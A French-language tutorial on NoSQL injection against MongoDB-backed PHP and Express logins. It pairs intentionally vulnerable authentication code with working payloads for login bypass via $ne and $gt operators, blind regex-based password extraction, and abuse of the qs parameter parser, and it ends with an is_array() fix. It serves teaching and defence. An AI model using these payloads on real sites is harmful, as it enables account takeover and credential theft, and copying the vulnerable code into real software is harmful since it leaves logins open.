# Failles web - injection NoSQL

## Description
Les bases NoSQL (Not Only SQL) sont apparues pour remédier aux problèmes de performances des SGBD traditionnels au regard de l'explosion du volume de donnée. Elles permettent également de gérer des données de types très différentes sur une base horizontale. Parmi les plus répandues on trouve d'abords MongoDB souvent utilisé derrière un back NodeJS, CouchDB, DynamoDB ou Oracle NoSQL

D'un point de vue code, 
* en PHP la gestion de la connexion avec la base se fait comme suit (hors robustesse):

    $clt = new MongoClient()
    $db = $clt->database;
    $users = $db->staff;
    $query = array(
        "user" => $_POST['login'],
        "password" => $_POST['password']
    );

    $result = $users->findOne($query); // Recherche de l'utilisateur
    if ($result)
        {
            // Authentifaction success
        }
    }

* en NodeJS, le code d'authentification ressemblerait à ça:

    db.collection(collection).find({"username":username, "password":password}).limit(1) ...
Ce code recherche une correspondance dans la base de donnée à partir de l'entrée utilisateur.

Pour utiliser MongoDB

    $ mongo
    > db.staff.insert({user:"utilisateur",password:"motdepasse");

## Détection
Les failles d'injections NoSQL interviennet en général lorsque nous pouvons passer des données JSON dans la requête et que cette requête peut être manipulée avec les opérateurs de comparaisons NoSQL.

Les opérateurs sont:
* $gt : greater than
* $lt : less than
* $gte : greater or equal
* $lte : less or or equal
* $ne : différent de

Donc par exemple l'objet JSON `[{"$gt":""}]` signifie plus grand que null. Condition toujours vraie.

En alanysant le code on peut également voir que en PHP si le méchanisme ne teste pas si l'entrée utilisateur n'est pas un array alors il existe un risque.

## Intention
Le but de l'injection NoSQL est assez proche de celui d'une injection SQL. Bypasser une authentification ou exfiltrer des données du site principalement.

## Exploitation

### Authentification bypass avec Hackbar
En utilisant l'outil [HackBar](https://addons.mozilla.org/fr/firefox/addon/hackbartool/), nous allons passer en `post data` la chaîne

    login[$ne]=admin&password[$ne]=mdp
L'opérateur différent `$ne` va correspondre (via l'exploitation de l'utilisation de la fonction PHP `array()`):

    login ≠ admin ET password ≠ mdp
Ce qui est vrai et donc bypass l'authentification.

### Authentification bypass avec Burp
En interceptant la requête de login, nous pourrons la modifier dans le module repeater. Dans la requête POST nous interceptons:

    {"username":"admin", "password":"hello"}
Que nous modifions en:

    {"username":"admin", "password":{"$gt":""}}
A la place du mot de passe on passe l'object JSON avec condition toujours vraie qui rend la requête toujours vraie, ce qui nous permet de bypasser l'authentification.

### Exploitation blind
Le problème de l'exploitation précedente et que nous n'avons pas le mot de passe administrateur. Pour l'avoir il va falloir utiliser les regex. Il faut savoir que lorsque nous utilisons des regex :
* `.` représente n'importe quel caractère
* `c{n}` repète n fois le caractère c 

Donc `.{3}` représente toutes les combinaisons de 3 caractères possibles. 

Pour retrouver le mot de passe il va falloir être patient.

* Déterminer le nombre de caractère :

    login[$ne]=admin&password[$regex]=.{1}
On incrémente de un jusqu'à ne pas être authentifié, ce qui indiquera le nombre de caractère. Pour poursuivre l'exemple ici 3 : `mdp`.

* Déterminer le mot de passe caractère par caractère:

    login[$ne]=admin&password[$regex]=a.{2}
On incrémente la lettre jusqu'à ne pas être authentifié, donc `m`. Puis:

    login[$ne]=admin&password[$regex]=ma.{1}
Puis:

    login[$ne]=admin&password[$regex]=mda
On incrémente le `a` jusqu'à ne pas être authentifié avec le `p`. Nous avons ainsi reconstruit le password `mdp`.

Il est intéressant d'automatiser cette tache avec notamment un script python ou Burp, un exemple est dans un des liens de la section.

### Exploiter le module `qs` d'`Express`
Le module `qs` est utilisé par défaut dans Express. Il convertit les paramètres HTTP en objet JSON. Ainsi la requête:

    login[value]=admin&password[value]=mdp
donnera:

    {"login": {"value":"admin"}, "password":{"value":"mdp"}}

Donc la requête:

    login=admin&password[$gt]=
Sera convertie en:

    {"login": "admin", "password":{"$gt":""}}
Ce qui correspond à bypasser l'authentification de l'utilisateur admin. Mais si nous ne connaissons pas d'utilisateur, nous pouvons saisir:

    login[$gt]=admin&password[$gt]=
En cas de succès nous serons connectés avec le premier utilisateur par ordre alphabétique arrivant après admin.

## Prévention
Pour se prémunir de cette faille, sur du code PHP il faut utiliser la fonction `is_array()` dans le test de validité des entrées utilisateurs:

    if (isset($_POST['login']) && isset($_POST['password']) && !is_array($_POST['password']) && !is_array($_POST['login']))

## Liens
https://www.dailysecurity.fr/nosql-injections-classique-blind/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.htmlhttps:/www.owasp.org/index.php/Testing_for_NoSQL_injection